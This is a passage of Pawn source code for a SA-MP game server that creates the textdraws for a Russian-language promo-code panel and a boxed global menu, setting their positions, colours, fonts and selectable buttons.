	TDEditor_PROMO[3] = TextDrawCreate(304.1567, 208.5847, "промокод"); // пусто
	TextDrawLetterSize(TDEditor_PROMO[3], 0.1797, 0.9697);
	TextDrawAlignment(TDEditor_PROMO[3], 1);
	TextDrawColor(TDEditor_PROMO[3], 255);
	TextDrawBackgroundColor(TDEditor_PROMO[3], 255);
	TextDrawFont(TDEditor_PROMO[3], 2);
	TextDrawSetProportional(TDEditor_PROMO[3], 1);
	TextDrawSetShadow(TDEditor_PROMO[3], 0);

	TDEditor_PROMO[4] = TextDrawCreate(231.9031, 222.2167, "код_активации~g~~h~~h~123~n~~n~~w~промокод_содержит:_~b~~h~~h~игровую_валюту,в_размере:_50000000_руб"); // пусто
	TextDrawLetterSize(TDEditor_PROMO[4], 0.1266, 1.0631);
	TextDrawTextSize(TDEditor_PROMO[4], 5511.0000, 0.0000);
	TextDrawAlignment(TDEditor_PROMO[4], 1);
	TextDrawColor(TDEditor_PROMO[4], -1);
	TextDrawBackgroundColor(TDEditor_PROMO[4], 255);
	TextDrawFont(TDEditor_PROMO[4], 2);
	TextDrawSetProportional(TDEditor_PROMO[4], 1);
	TextDrawSetShadow(TDEditor_PROMO[4], 0);

	TDEditor_PROMO[5] = TextDrawCreate(231.8715, 249.6846, "количество_активаций:_~b~~h~~h~1000"); // пусто
	TextDrawLetterSize(TDEditor_PROMO[5], 0.1266, 1.0631);
	TextDrawTextSize(TDEditor_PROMO[5], 5511.0000, 0.0000);
	TextDrawAlignment(TDEditor_PROMO[5], 1);
	TextDrawColor(TDEditor_PROMO[5], -1);
	TextDrawBackgroundColor(TDEditor_PROMO[5], 255);
	TextDrawFont(TDEditor_PROMO[5], 2);
	TextDrawSetProportional(TDEditor_PROMO[5], 1);
	TextDrawSetShadow(TDEditor_PROMO[5], 0);

	TDEditor_PROMO[6] = TextDrawCreate(227.1497, 278.7990, "LD_SPAC:white"); // пусто
	TextDrawTextSize(TDEditor_PROMO[6], 197.4797, 16.0000);
	TextDrawAlignment(TDEditor_PROMO[6], 1);
	TextDrawColor(TDEditor_PROMO[6], 1076768511);
	TextDrawBackgroundColor(TDEditor_PROMO[6], 255);
	TextDrawFont(TDEditor_PROMO[6], 4);
	TextDrawSetProportional(TDEditor_PROMO[6], 0);
	TextDrawSetShadow(TDEditor_PROMO[6], 0);
	TextDrawSetSelectable(TDEditor_PROMO[6], true);

	TDEditor_PROMO[7] = TextDrawCreate(229.0919, 266.7167, "Box"); // пусто
	TextDrawLetterSize(TDEditor_PROMO[7], 0.0000, 1.0512);
	TextDrawTextSize(TDEditor_PROMO[7], 423.0000, 0.0000);
	TextDrawAlignment(TDEditor_PROMO[7], 1);
	TextDrawColor(TDEditor_PROMO[7], -1);
	TextDrawUseBox(TDEditor_PROMO[7], 1);
	TextDrawBoxColor(TDEditor_PROMO[7], 757935615);
	TextDrawBackgroundColor(TDEditor_PROMO[7], 255);
	TextDrawFont(TDEditor_PROMO[7], 1);
	TextDrawSetProportional(TDEditor_PROMO[7], 1);
	TextDrawSetShadow(TDEditor_PROMO[7], 0);

	TDEditor_PROMO[8] = TextDrawCreate(288.7558, 280.3059, "закрыть_панель"); // пусто
	TextDrawLetterSize(TDEditor_PROMO[8], 0.1849, 1.1914);
	TextDrawAlignment(TDEditor_PROMO[8], 1);
	TextDrawColor(TDEditor_PROMO[8], -1);
	TextDrawBackgroundColor(TDEditor_PROMO[8], 255);
	TextDrawFont(TDEditor_PROMO[8], 2);
	TextDrawSetProportional(TDEditor_PROMO[8], 1);
	TextDrawSetShadow(TDEditor_PROMO[8], 0);

	TDEditor_PROMO[9] = TextDrawCreate(232.8401, 266.1856, "активировать_промокод:_~y~/mn_->промокод"); // пусто
	TextDrawLetterSize(TDEditor_PROMO[9], 0.1393, 1.0398);
	TextDrawTextSize(TDEditor_PROMO[9], 5511.0000, 0.0000);
	TextDrawAlignment(TDEditor_PROMO[9], 1);
	TextDrawColor(TDEditor_PROMO[9], -1);
	TextDrawBackgroundColor(TDEditor_PROMO[9], 255);
	TextDrawFont(TDEditor_PROMO[9], 2);
	TextDrawSetProportional(TDEditor_PROMO[9], 1);
	TextDrawSetShadow(TDEditor_PROMO[9], 0);

	TDEditor_MENU_GLOBAL[0] = TextDrawCreate(18.500696, 112.161125, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[0], 0.000000, 17.275001);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[0], 224.360351, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[0], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[0], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[0], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[0], 865730559);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[0], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[0], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[0], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[0], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[0], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[0], 0);

	TDEditor_MENU_GLOBAL[1] = TextDrawCreate(19.500738, 122.951667, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[1], 0.000000, 15.956954);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[1], 223.270401, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[1], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[1], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[1], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[1], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[1], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[1], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[1], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[1], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[1], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[1], 0);

	TDEditor_MENU_GLOBAL[2] = TextDrawCreate(18.400688, 273.037414, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[2], 0.000000, 8.652009);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[2], 224.109939, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[2], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[2], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[2], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[2], 865730559);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[2], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[2], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[2], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[2], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[2], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[2], 0);

	TDEditor_MENU_GLOBAL[3] = TextDrawCreate(19.200735, 283.500579, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[3], 0.000000, 7.424907);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[3], 223.310379, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[3], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[3], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[3], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[3], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[3], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[3], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[3], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[3], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[3], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[3], 0);

	TDEditor_MENU_GLOBAL[4] = TextDrawCreate(230.196136, 260.138763, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[4], 0.000000, 8.044892);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[4], 420.040039, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[4], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[4], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[4], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[4], 865730559);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[4], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[4], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[4], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[4], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[4], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[4], 0);

	TDEditor_MENU_GLOBAL[5] = TextDrawCreate(231.200134, 270.014312, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[5], 0.000000, 6.881710);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[5], 419.347412, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[5], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[5], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[5], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[5], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[5], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[5], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[5], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[5], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[5], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[5], 0);

	TDEditor_MENU_GLOBAL[6] = TextDrawCreate(230.496154, 112.497528, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[6], 0.000000, 15.838170);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[6], 420.200195, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[6], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[6], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[6], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[6], 865730559);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[6], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[6], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[6], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[6], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[6], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[6], 0);

	TDEditor_MENU_GLOBAL[7] = TextDrawCreate(231.500122, 123.338043, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[7], 0.000000, 14.530838);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[7], 419.359375, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[7], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[7], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[7], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[7], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[7], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[7], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[7], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[7], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[7], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[7], 0);

	TDEditor_MENU_GLOBAL[8] = TextDrawCreate(426.396209, 112.560050, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[8], 0.000000, 26.516046);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[8], 619.979003, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[8], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[8], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[8], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[8], 865730559);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[8], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[8], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[8], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[8], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[8], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[8], 0);

	TDEditor_MENU_GLOBAL[9] = TextDrawCreate(427.300262, 123.797355, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[9], 0.000000, 25.179050);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[9], 619.000000, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[9], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[9], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[9], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[9], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[9], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[9], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[9], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[9], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[9], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[9], 0);

	TDEditor_MENU_GLOBAL[10] = TextDrawCreate(24.896211, 288.924896, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[10], 0.000000, 4.564980);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[10], 217.899993, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[10], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[10], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[10], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[10], 865730559);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[10], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[10], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[10], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[10], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[10], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[10], 0);

	TDEditor_MENU_GLOBAL[11] = TextDrawCreate(26.100263, 290.363098, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[11], 0.000000, 4.293992);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[11], 216.180633, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[11], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[11], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[11], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[11], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[11], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[11], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[11], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[11], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[11], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[11], 0);

	TDEditor_MENU_GLOBAL[12] = TextDrawCreate(85.500068, 289.050598, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[12], 0.000000, -0.241003);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[12], 89.050491, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[12], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[12], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[12], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[12], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[12], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[12], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[12], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[12], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[12], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[12], 0);

	TDEditor_MENU_GLOBAL[13] = TextDrawCreate(85.500068, 332.253234, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[13], 0.000000, -0.241003);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[13], 89.050491, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[13], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[13], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[13], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[13], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[13], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[13], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[13], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[13], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[13], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[13], 0);

	TDEditor_MENU_GLOBAL[14] = TextDrawCreate(151.800872, 332.253234, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[14], 0.000000, -0.241003);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[14], 155.351562, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[14], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[14], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[14], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[14], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[14], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[14], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[14], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[14], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[14], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[14], 0);

	TDEditor_MENU_GLOBAL[15] = TextDrawCreate(152.000762, 288.797912, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[15], 0.000000, -0.241003);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[15], 155.363098, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[15], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[15], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[15], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[15], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[15], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[15], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[15], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[15], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[15], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[15], 0);

	TDEditor_MENU_GLOBAL[16] = TextDrawCreate(429.304107, 125.784049, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[16], 0.000000, 8.564984);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[16], 487.000000, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[16], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[16], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[16], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[16], 865730559);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[16], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[16], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[16], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[16], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[16], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[16], 0);

	TDEditor_MENU_GLOBAL[17] = TextDrawCreate(430.208831, 126.737129, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[17], 0.000000, 8.372941);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[17], 485.907958, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[17], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[17], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[17], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[17], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[17], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[17], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[17], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[17], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[17], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[17], 0);

	TDEditor_MENU_GLOBAL[18] = TextDrawCreate(492.804138, 125.684051, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[18], 0.000000, 23.174041);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[18], 617.000000, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[18], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[18], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[18], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[18], 865730559);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[18], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[18], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[18], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[18], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[18], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[18], 0);

	TDEditor_MENU_GLOBAL[19] = TextDrawCreate(493.708862, 126.699661, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[19], 0.000000, 22.929899);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[19], 616.000000, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[19], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[19], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[19], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[19], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[19], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[19], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[19], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[19], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[19], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[19], 0);

	TDEditor_MENU_GLOBAL[20] = TextDrawCreate(19.200012, 137.896728, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[20], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[20], 204.589126, 12.529943);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[20], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[20], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[20], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[20], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[20], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[20], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[20], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[20], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[20], true);

	TDEditor_MENU_GLOBAL[21] = TextDrawCreate(19.200012, 151.697235, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[21], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[21], 204.589126, 12.529943);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[21], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[21], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[21], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[21], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[21], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[21], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[21], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[21], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[21], true);

	TDEditor_MENU_GLOBAL[22] = TextDrawCreate(19.200012, 165.798095, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[22], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[22], 204.589126, 12.529943);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[22], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[22], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[22], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[22], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[22], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[22], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[22], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[22], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[22], true);

	TDEditor_MENU_GLOBAL[23] = TextDrawCreate(19.200012, 179.598937, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[23], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[23], 204.589126, 12.529943);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[23], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[23], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[23], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[23], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[23], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[23], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[23], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[23], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[23], true);

	TDEditor_MENU_GLOBAL[24] = TextDrawCreate(19.200012, 193.499786, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[24], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[24], 204.589126, 12.529943);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[24], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[24], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[24], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[24], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[24], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[24], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[24], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[24], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[24], true);

	TDEditor_MENU_GLOBAL[25] = TextDrawCreate(19.200012, 207.100616, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[25], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[25], 204.589126, 12.529943);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[25], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[25], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[25], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[25], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[25], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[25], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[25], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[25], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[25], true);

	TDEditor_MENU_GLOBAL[26] = TextDrawCreate(21.400022, 335.517028, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[26], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[26], 201.000000, 13.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[26], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[26], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[26], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[26], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[26], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[26], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[26], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[26], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[26], true);

	TDEditor_MENU_GLOBAL[27] = TextDrawCreate(21.000694, 267.301086, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[27], 0.000000, -0.384018);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[27], 221.169906, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[27], 1);
